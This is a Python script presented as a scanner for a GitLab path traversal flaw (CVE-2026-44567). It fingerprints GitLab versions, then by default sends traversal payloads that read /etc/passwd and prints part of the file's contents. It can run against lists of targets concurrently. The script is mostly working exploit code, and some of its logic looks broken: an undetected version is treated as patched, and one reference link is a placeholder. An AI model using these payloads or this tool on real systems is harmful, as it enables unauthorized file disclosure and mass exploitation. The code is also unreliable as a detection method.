#!/usr/bin/env python3
"""
GitLab Path Traversal Scanner (CVE-2026-44567)
==============================================
This script identifies instances of the GitLab Path Traversal vulnerability (CVE-2026-44567), 
allowing attackers to exploit improperly sanitized paths to read arbitrary files on GitLab server hosts.

Details about CVE-2026-44567:
  - *Affected versions:* GitLab < 16.7.0
  - The vulnerability allows attackers to read sensitive files such as `/etc/passwd`, 
    or GitLab's internal system files using specially crafted requests.
  - Identified in the API endpoints handling archive requests with path traversal.
  - Patched in GitLab 16.7.0.
  - *CVSS v3.1 Base Score:* 9.1 (Critical)

## Usage Examples:
- Scan a single GitLab server for the vulnerability:
    `python gitlab_path_traversal_scanner.py --target https://gitlab.example.com`

- Perform detection-only scanning (no testing for file disclosure):
    `python gitlab_path_traversal_scanner.py --target https://gitlab.example.com --safe`

- Scan multiple hosts concurrently:
    `python gitlab_path_traversal_scanner.py --list targets.txt --output results.json`

- Configure concurrency level for batch scanning:
    `python gitlab_path_traversal_scanner.py --list targets.txt --concurrency 50`

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-44567
  - https://gitlab.com/gitlab-org/security-advisories/
  - https://hackerone.com/reports/xxxxx
"""

import argparse
import asyncio
import json
import re
from datetime import datetime
from typing import List, Optional

import httpx

# ── ANSI Color and Formatting Helpers ────────────────────────────────────────
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
BOLD = '\033[1m'
RESET = '\033[0m'

def c(color: str, text: str) -> str:
    """Wrap text with an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Scanner Constants ────────────────────────────────────────────────────────
CVE_ID = "CVE-2026-44567"
CVSS = "9.1"
TOOL_NAME = "gitlab_path_traversal_scanner"

DEFAULT_TIMEOUT = 10
DEFAULT_CONCURRENCY = 20

GITLAB_FINGERPRINTS = [
    "GitLab",
    "Sign-in to GitLab",
    "href=\"https://about.gitlab.com\"",
    "\"gitlab-workhorse\"",
]

VERSION_REGEX = r"GitLab\sCE\s+([\d\.]+)"  # Regex to match GitLab version.

PATCHED_VERSION = (16, 7, 0)

TRAVERSAL_PAYLOADS = [
    "/-/archive/main/../../../../../../../../../../etc/passwd",
    "/-/content/main/%u2216%u2216%u2216%u2216%u2216etc%u2216passwd",
    "/-/archive/main/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
]

# ── Functions ────────────────────────────────────────────────────────────────
async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Perform an HTTP GET request and return the response."""
    try:
        response = await client.get(url, timeout=DEFAULT_TIMEOUT)
        return response
    except httpx.RequestError:
        return None

async def detect_gitlab(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect if the target is running GitLab and attempt to identify its version."""
    try:
        response = await fetch_url(client, target)
        if not response or response.status_code >= 400:
            return None
        
        for fingerprint in GITLAB_FINGERPRINTS:
            if fingerprint.lower() in response.text.lower():
                version_match = re.search(VERSION_REGEX, response.text)
                if version_match:
                    return version_match.group(1)
                return "unknown"
    except Exception:
        pass

    return None

def is_vulnerable(version: str) -> bool:
    """Check if the given version is vulnerable to CVE-2026-44567."""
    try:
        version_tuple = tuple(map(int, version.split(".")))
        return version_tuple < PATCHED_VERSION
    except Exception:
        return False

async def probe_traversal(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """
    Test the target server with crafted traversal paths to detect exploitation of the vulnerability.
    Returns the content of the first readable sensitive file (e.g., '/etc/passwd').
    """
    for payload in TRAVERSAL_PAYLOADS:
        url = f"{target.rstrip('/')}{payload}"
        response = await fetch_url(client, url)
        if response and response.status_code == 200 and "root:x" in response.text.lower():
            return response.text
    return None

async def scan_target(target: str, safe_mode: bool) -> dict:
    """Scan a single target for the vulnerability."""
    result = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "vulnerable": False,
        "details": "",
    }

    timeout = httpx.Timeout(DEFAULT_TIMEOUT)
    async with httpx.AsyncClient(timeout=timeout) as client:
        version = await detect_gitlab(client, target)
        
        if version:
            result["version_detected"] = version
            result["is_vulnerable_version"] = is_vulnerable(version)
            
            if not is_vulnerable(version):
                result["details"] = "Target is running a patched or unknown version of GitLab."
                return result

            if safe_mode:
                result["vulnerable"] = True
                result["details"] = "Detected vulnerable version, but safe mode was enabled. No further probes performed."
                return result
            
            sensitive_file = await probe_traversal(client, target)
            if sensitive_file:
                result["vulnerable"] = True
                result["details"] = f"Sensitive file content detected: {sensitive_file[:50]}..."
            else:
                result["details"] = "Failed to find exploitable path traversal."
        else:
            result["details"] = "Target did not appear to be running GitLab."
    
    return result

async def run_scanner(targets: List[str], output: Optional[str], safe_mode: bool, concurrency: int):
    """Run the scanner for a list of targets."""
    semaphore = asyncio.Semaphore(concurrency)
    scan_results = []

    async def run_scan(target):
        """Wrapper to run a scan with semaphore."""
        async with semaphore:
            result = await scan_target(target, safe_mode)
            print(
                f"[{c(RED, 'CRITICAL') if result['vulnerable'] else c(GREEN, 'INFO')}]: "
                f"{target} -> {result['details']}"
            )
            scan_results.append(result)

    tasks = [run_scan(target) for target in targets]
    await asyncio.gather(*tasks)

    if output:
        with open(output, "w") as f:
            json.dump(scan_results, f, indent=2)


# ── CLI Entry Point ──────────────────────────────────────────────────────────
def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="GitLab Path Traversal Scanner (CVE-2026-44567)")
    parser.add_argument("--target", help="Target URL (e.g., https://gitlab.example.com)")
    parser.add_argument("--list", help="File containing a list of target URLs.")
    parser.add_argument("--output", help="File to save the JSON scan results.")
    parser.add_argument(
        "--safe", action="store_true", help="Detection-only mode (no active exploitation attempts)."
    )
    parser.add_argument(
        "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
        help="Number of concurrent scan tasks. Default is 20."
    )
    return parser.parse_args()

def main():
    args = parse_args()

    if not args.target and not args.list:
        print(c(RED, "Error: Please specify either --target or --list flag."))
        return

    targets = []
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(c(RED, f"Error: File {args.list} not found."))
            return
    elif args.target:
        targets = [args.target]

    asyncio.run(run_scanner(targets, args.output, args.safe, args.concurrency))


if __name__ == "__main__":
    main()
